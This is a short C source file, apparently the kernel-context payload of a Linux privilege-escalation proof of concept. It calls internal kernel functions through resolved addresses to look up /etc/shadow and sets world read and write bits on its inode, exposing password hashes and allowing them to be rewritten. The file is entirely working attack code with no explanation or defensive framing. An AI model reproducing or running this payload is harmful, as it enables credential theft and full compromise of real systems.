#include "poc.h"

void _start(void) {
	int (*user_path_at_empty)(int, char *, unsigned, void *, int *) = (void *)(X_user_path_at_empty + 5);
	int (*path_put)(void *) = (void *)(X_path_put + 5);
	struct path { void *mnt; void *dentry; } path = { 0 };
	if (!user_path_at_empty(-100, (char []){ "/etc/shadow" }, 0, &path, 0)) {
		void *inode = (void *)(*(long *)(path.dentry + 48)); // dentry->d_inode
		*(unsigned short *)(inode + 0) |= 0666; // inode->i_mode
		path_put(&path);
	}
}
